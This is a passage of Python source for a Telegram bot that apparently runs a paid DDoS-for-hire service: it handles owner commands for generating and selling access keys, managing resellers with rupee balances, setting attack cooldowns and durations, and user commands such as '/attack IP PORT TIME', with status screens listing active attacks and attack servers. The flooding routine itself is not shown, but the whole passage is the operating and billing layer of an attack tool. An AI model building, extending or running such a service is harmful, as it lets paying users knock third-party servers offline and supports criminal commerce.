        revoke(p[1])
        bot.reply_to(m, f"❌ Group {p[1]} revoked")
    
    elif cmd == 'delkey':
        if len(p) != 2: return bot.reply_to(m, "/delkey <key>")
        if p[1].upper() in codes: del codes[p[1].upper()]; save_all(); bot.reply_to(m, f"✅ Deleted {p[1]}")
        else: bot.reply_to(m, "❌ Not found")
    
    elif cmd == 'checkuser':
        if len(p) != 2: return bot.reply_to(m, "/checkuser <user_id>")
        for k, d in codes.items():
            for ui in d.get('used_by', []):
                if (ui['user_id'] if isinstance(ui, dict) else ui) == int(p[1]):
                    return bot.reply_to(m, f"User {p[1]}: Key {k} ({d['name']})\nExpires: {datetime.fromtimestamp(d['expires']).strftime('%Y-%m-%d %H:%M:%S') if d.get('expires') else 'Never'}")
        bot.reply_to(m, f"User {p[1]}: No active key")
    
    elif cmd == 'resetcooldown':
        if len(p) != 2: return bot.reply_to(m, "/resetcooldown <user_id>")
        if p[1] in cooldown: del cooldown[p[1]]; save_all()
        bot.reply_to(m, f"✅ Reset cooldown for {p[1]}")
    
    elif cmd == 'resetuserattack':
        if len(p) != 3: return bot.reply_to(m, "/resetuserattack <user_id> <group_id>")
        key = f"{p[1]}_{p[2]}"
        if key in user_attack_count: del user_attack_count[key]; save_all()
        bot.reply_to(m, f"✅ Reset attack limit for user {p[1]} in group {p[2]}")
    
    elif cmd == 'status':
        bot.reply_to(m, f"""📊 BOT STATUS
━━━━━━━━━━━━━━━━━━
🟢 Bot: {'ON' if bot_enabled else 'OFF'}
🔥 Active Attacks: {active_count()}
⚔️ Total Attacks: {attack_count}
📸 Feedback: {'ON' if is_feedback_enabled() else 'OFF'}
🔐 Channel Verify: {'ON' if is_channel_verify_enabled() else 'OFF'}
📡 Concurrent Limit: {CONCURRENT}
🖥️ Servers: {SERVER_TOTAL}
⏱️ Max Time: {MAX_ATTACK}s
👥 Owners: {len(OWNER_IDS)}
🔑 Keys: {len(codes)}
👥 Resellers: {len(resellers)}
✅ Approved Groups: {len(approved_groups)}
━━━━━━━━━━━━━━━━━━
⏰ Uptime: {uptime()}""")
    
    elif cmd == 'running':
        if not active: bot.reply_to(m, "No active attacks")
        else: 
            msg = "🔥 ACTIVE ATTACKS\n━━━━━━━━━━━━━━━━━━\n"
            for uid, d in active.items():
                remaining = int(d['end'] - time.time())
                display = get_owner_name(uid) if is_owner(uid) else str(uid)
                msg += f"👤 {display}\n🎯 {d['target']}\n⏱️ {remaining}s left\n━━━━━━━━━━━━━━━━━━\n"
            bot.reply_to(m, msg)
    
    elif cmd == 'screenshot':
        if uid not in pending: bot.reply_to(m, "No pending")
        elif time.time() > pending[uid]['expires']: del pending[uid]; bot.reply_to(m, "Expired")
        else: bot.reply_to(m, f"Send screenshot for {pending[uid]['target']}")
    
    elif cmd == 'balance':
        if not is_reseller(str(uid)): bot.reply_to(m, "Not a reseller")
        else: bot.reply_to(m, f"💰 ₹{resellers[str(uid)]['balance']}\n🔑 {resellers[str(uid)].get('keys_generated', 0)} keys")
    
    elif cmd == 'setmax':
        if len(p) != 2: return
        st["max_duration"] = int(p[1])
        save_all()
        bot.reply_to(m, f"✅ Max {p[1]}s")
    
    elif cmd == 'setcooldown':
        if len(p) != 2: return
        st["cooldown"] = int(p[1])
        save_all()
        bot.reply_to(m, f"✅ Cd {p[1]}s")
    
    elif cmd == 'addreseller':
        if len(p) != 3: return
        resellers[p[1]] = {"balance": int(p[2]), "keys_generated": 0}
        save_all()
        bot.reply_to(m, f"✅ Added {p[1]}")
    
    elif cmd == 'addbalance':
        if len(p) != 3 or p[1] not in resellers: return
        resellers[p[1]]["balance"] += int(p[2])
        save_all()
        bot.reply_to(m, f"✅ +₹{p[2]}")
    
    elif cmd == 'resellers':
        if not resellers: bot.reply_to(m, "No resellers")
        else: 
            msg = "👥 RESELLERS\n━━━━━━━━━━━━━━━━━━\n"
            for i, d in resellers.items():
                blocked = "🔴 BLOCKED" if i in blocked_resellers else "🟢"
                msg += f"ID: {i}\n💰 ₹{d['balance']}\n🔑 {d.get('keys_generated', 0)} keys\n📊 {blocked}\n━━━━━━━━━━━━━━━━━━\n"
            bot.reply_to(m, msg[:4000])
    
    elif cmd == 'on':
        bot_enabled = True
        bot.reply_to(m, "✅ Bot ON")
    
    elif cmd == 'off':
        bot_enabled = False
        bot.reply_to(m, "❌ Bot OFF")
    
    elif cmd == 'groups':
        if not approved_groups:
            bot.reply_to(m, "No approved groups")
        else:
            msg = "✅ APPROVED GROUPS\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(approved_groups.keys())
            bot.reply_to(m, msg[:4000])
    
    elif cmd == 'keys':
        if not codes:
            bot.reply_to(m, "No keys")
        else:
            msg = "🔑 KEYS\n━━━━━━━━━━━━━━━━━━\n"
            for k, v in codes.items():
                msg += f"{k}: {v['name']} ({len(v.get('used_by', []))}/{v['max_users']})\n"
            bot.reply_to(m, msg[:4000])
    
    elif cmd == 'allkeys':
        if not codes:
            bot.reply_to(m, "No keys")
        else:
            msg = "🔑 ALL KEYS\n━━━━━━━━━━━━━━━━━━\n"
            for k, v in codes.items():
                exp = v.get('expires', 0)
                status = 'ACTIVE' if exp > time.time() else 'EXPIRED' if v.get('activated_at') else 'INACTIVE'
                msg += f"{k}: {v['name']} | {len(v.get('used_by', []))}/{v['max_users']} | {status}\n"
            bot.reply_to(m, msg[:4000])
    
    elif cmd == 'delkeys':
        if len(p) == 2 and p[1].lower() == 'confirm':
            codes.clear()
            save_all()
            bot.reply_to(m, "✅ All keys deleted")
        else: bot.reply_to(m, "⚠️ /delkeys confirm")
    
    elif cmd == 'stats':
        total_used = sum(len(v.get('used_by', [])) for v in codes.values())
        bot.reply_to(m, f"""📊 BOT STATS
━━━━━━━━━━━━━━━━━━
⏰ Uptime: {uptime()}
👥 Total Users: {total_used}
✅ Groups: {len(approved_groups)}
⚔️ Attacks: {attack_count}
👥 Resellers: {len(resellers)}
🔑 Keys: {len(codes)}
🖥️ Servers: {SERVER_TOTAL}
🔥 Concurrent: {CONCURRENT}
⏱️ Max Time: {MAX_ATTACK}s""")
    
    elif cmd == 'stop':
        active.clear()
        bot.reply_to(m, "✅ All attacks stopped")
    
    elif cmd == 'serverinfo':
        sv, ac = server_status()
        bot.reply_to(m, f"""🖥️ SERVER STATUS
━━━━━━━━━━━━━━━━━━
📡 Total: {SERVER_TOTAL}
🔥 Active: {ac}
━━━━━━━━━━━━━━━━━━
{''.join(sv)}""")
    
    elif cmd == 'maintenance':
        maintenance_mode = True
        maintenance_msg = " ".join(p[1:]) if len(p) > 1 else "Under maintenance"
        bot.reply_to(m, f"🔧 MAINTENANCE ON\n{maintenance_msg}")
    
    elif cmd == 'ok':
        maintenance_mode = False
        bot.reply_to(m, "✅ Maintenance OFF")
    
    elif cmd == 'delexpkey':
        ex = [k for k, v in codes.items() if v.get('expires', 0) < time.time()]
        for k in ex: del codes[k]
        save_all()
        bot.reply_to(m, f"✅ Deleted {len(ex)} expired keys")

# USER BASIC COMMANDS
@bot.message_handler(commands=['start','help','verify','confirm_join','activate'])
def user_commands(m):
    uid = m.from_user.id
    cid = m.chat.id
    ct = m.chat.type
    cmd = m.text.split()[0][1:]
    p = m.text.split()
    
    if cmd == 'start':
        if is_owner(uid):
            bot.reply_to(m, f"""🔥 OWNER BOT 🔥

📊 *STATUS*
• Bot: {'ON' if bot_enabled else 'OFF'}
• Concurrent: {CONCURRENT}/{SERVER_TOTAL}
• Max Time: {MAX_ATTACK}s
• Keys: {len(codes)}
• Resellers: {len(resellers)}
• Groups: {len(approved_groups)}

📌 /allcommands - All commands""", parse_mode='Markdown')
        elif ct == 'private':
            if is_banned(uid):
                bot.reply_to(m, "🚫 Banned!")
            elif has_key(uid):
                bot.reply_to(m, f"""🔥 KEY ACTIVE!

⚔️ /attack IP PORT TIME
📊 /status - Bot status
👤 /user - Your info
🔑 /activate KEY - Activate key""")
            else:
                bot.reply_to(m, f"""🔑 Welcome!

🔑 /activate KEY - Activate premium
👤 /user - Check status
🛒 /prices - See key prices

📌 Contact: @owner""")
        else:
            bot.reply_to(m, f"""🔥 GROUP BOT

📊 Group: {'✅ APPROVED' if is_approved(cid) else '❌ NOT APPROVED'}

⚔️ /attack IP PORT TIME
🔐 /verify - Channel verify""")
    
    elif cmd == 'verify':
        if ct != 'private':
            bot.reply_to(m, "Use in private")
        else:
            bot.reply_to(m, f"🔐 Join channel: {REQUIRED_CHANNEL}\nThen /confirm_join")
    
    elif cmd == 'confirm_join':
        verify_channel(uid)
        bot.reply_to(m, "✅ Verified! Now you can use bot in groups.")
    
    elif cmd == 'activate':
        if ct != 'private':
            return
        if len(p) == 2 and use_key(uid, p[1].upper()):
            bot.reply_to(m, "✅ Key activated successfully!")
        else:
            bot.reply_to(m, "❌ Invalid or expired key!")
    
    elif cmd == 'help':
        if is_owner(uid):
            bot.reply_to(m, "/allcommands - All bot commands")
        else:
            bot.reply_to(m, f"""📌 USER COMMANDS

⚔️ /attack IP PORT TIME - Start attack
📊 /status - Bot status
🔥 /running - Active attacks
👤 /user - Your info
🔑 /activate KEY - Activate key
🔐 /verify - Channel verify
🛒 /prices - Key prices""")

@bot.message_handler(commands=['allcommands'])
def allcommands_cmd(m):
    if not is_owner(m.from_user.id):
        return bot.reply_to(m, "❌ Owner only!")
    
    cmds = """🔥 ALL COMMANDS 🔥

📌 OWNER COMMANDS:
━━━━━━━━━━━━━━━━━━
🔄 /extendkey <key/id> <time> - Extend key
🔄 /extendallkey <time> - Extend all keys
👥 /keyusers <key> - Show key users
⬇️ /down <key/id> <time> - Reduce time
⏰ /tban <id> <time> [reason] - Temp ban
➕ /add_reseller <id> - Add reseller
➖ /remove_reseller <id> - Remove reseller
🚫 /block_reseller <id> - Block reseller
✅ /unblock_reseller <id> - Unblock reseller
👥 /all_resellers - List resellers
💰 /saldoadd <id> <amt> - Add balance
💰 /saldoremove <id> <amt> - Remove balance
💰 /saldo <id> - Check balance
⚙️ /setgrp <gid> <setting> <val> - Config group
📢 /broadcast <msg> - To all users
📢 /broadcastreseller <msg> - To resellers
📢 /broadcastpaid <msg> - To paid users
🔧 /maintenance <msg> - Maintenance ON
✅ /ok - Maintenance OFF
🗑️ /delexpkey - Delete expired keys
⏱️ /setcooldowngroup <gid> <sec> - Group cooldown
⏱️ /setcooldownuser <uid> <sec> - User cooldown
⏱️ /setmaxtimeuser <uid> <sec> - User max time
⏱️ /setglobalcooldown <sec> - Global cooldown
⏱️ /setmaxtimegroup <gid> <sec> - Group max time
⏱️ /setmaxcongroup <gid> <num> - Group concurrent
⏱️ /setmaxtimeattackperpersongroup <gid> <num> - Per-person limit
📸 /setonofffeedback on/off - Feedback toggle
🔐 /onoffchannelverify on/off - Channel verify toggle
🚫 /ban <id> - Ban user
✅ /unban <id> - Unban user
🚫 /addport <port> - Block port
✅ /removeport <port> - Unblock port
🚫 /addip <ip> - Block IP
✅ /removeip <ip> - Unblock IP
🟢 /on - Bot ON
🔴 /off - Bot OFF
✅ /approve <gid> - Approve group
❌ /revoke <gid> - Revoke group
📋 /groups - List groups
🔑 /gen <name> <time> [max] - Generate key
🔑 /keys - List keys
🔑 /allkeys - All keys details
🗑️ /delkey <key> - Delete key
🗑️ /delkeys confirm - Delete all keys
📊 /stats - Bot stats
⏹️ /stop - Stop all attacks
🔍 /checkuser <id> - Check user
🔄 /resetcooldown <id> - Reset cooldown
🔄 /resetuserattack <id> <gid> - Reset attack limit
🖥️ /serverinfo - Server status
📊 /status - Bot status
🔥 /running - Active attacks
🔐 /my_api - Show API config

📌 USER COMMANDS:
━━━━━━━━━━━━━━━━━━
⚔️ /attack IP PORT TIME - Start attack
📊 /status - Bot status
🔥 /running - Active attacks
👤 /user - Your info
🔑 /activate KEY - Activate key
🔐 /verify - Channel verify
🛒 /prices - Key prices

📌 TIME OPTIONS:
━━━━━━━━━━━━━━━━━━
30min, 1hr, 2hr, 5hr, 12hr, 1d, 3d, 7d, 15d, 30d"""
    bot.reply_to(m, cmds)

@bot.message_handler(commands=['status'])
def status_cmd(m):
    uid = m.from_user.id
    if is_owner(uid):
        bot.reply_to(m, f"""📊 BOT STATUS
━━━━━━━━━━━━━━━━━━
🟢 Bot: {'ON' if bot_enabled else 'OFF'}
🔥 Active: {active_count()}
⚔️ Attacks: {attack_count}
📡 Concurrent: {CONCURRENT}/{SERVER_TOTAL}
⏱️ Max Time: {MAX_ATTACK}s
🔑 Keys: {len(codes)}
👥 Resellers: {len(resellers)}
✅ Groups: {len(approved_groups)}
⏰ Uptime: {uptime()}""")
    else:
        bot.reply_to(m, f"""📊 BOT STATUS
━━━━━━━━━━━━━━━━━━
🟢 Bot: {'ON' if bot_enabled else 'OFF'}
🔥 Active: {active_count()}
📡 Concurrent: {CONCURRENT}/{SERVER_TOTAL}
⏱️ Max Time: {MAX_ATTACK}s
⏰ Uptime: {uptime()}""")

@bot.message_handler(commands=['running'])
def running_cmd(m):
    if not active:
        bot.reply_to(m, "No active attacks")
    else:
        msg = "🔥 ACTIVE ATTACKS\n━━━━━━━━━━━━━━━━━━\n"
        for uid, d in active.items():
            remaining = int(d['end'] - time.time())
            display = get_owner_name(uid) if is_owner(uid) else str(uid)
            msg += f"👤 {display}\n🎯 {d['target']}\n⏱️ {remaining}s left\n━━━━━━━━━━━━━━━━━━\n"
        bot.reply_to(m, msg)

print("✅ BOT STARTED!")
print("✅ CONCURRENT: 5")
print("✅ SERVERS: 5")
print("✅ MAX TIME: 300s")
print("✅ OWNER CONFIGURED")
print("✅ API CONFIGURED")
bot.infinity_polling()
